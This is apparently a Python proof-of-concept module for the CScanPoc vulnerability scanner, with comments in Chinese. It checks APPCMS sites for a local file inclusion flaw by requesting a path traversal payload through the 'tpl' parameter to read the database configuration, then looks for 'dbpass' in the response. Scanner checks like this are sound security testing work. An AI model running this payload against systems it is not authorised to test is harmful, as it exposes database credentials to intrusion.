# coding: utf-8

import logging
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'APPCMS_0002'  # 平台漏洞编号，留空
    name = 'APPCMS 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        直接访问 http://test/index.php?tpl=../../install/templates/step4.php ，它会读取数据库配置文件。
    '''  # 漏洞描述
    ref = 'http://www.shellcodes.org/Hacking/AppCMS%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'APPCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0b438175-93b4-4d1b-b1be-09efebfa71e2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?tpl=../../install/templates/step4.php'
            verify_url = self.target + payload
            #code, head, body, errcode, final_url = curl.curl2(target)
            r = requests.get(verify_url)

            print(type(r.text))
            if r.status_code == 200 and 'host' in r.text and 'dbpass' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            logging.exception('')
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
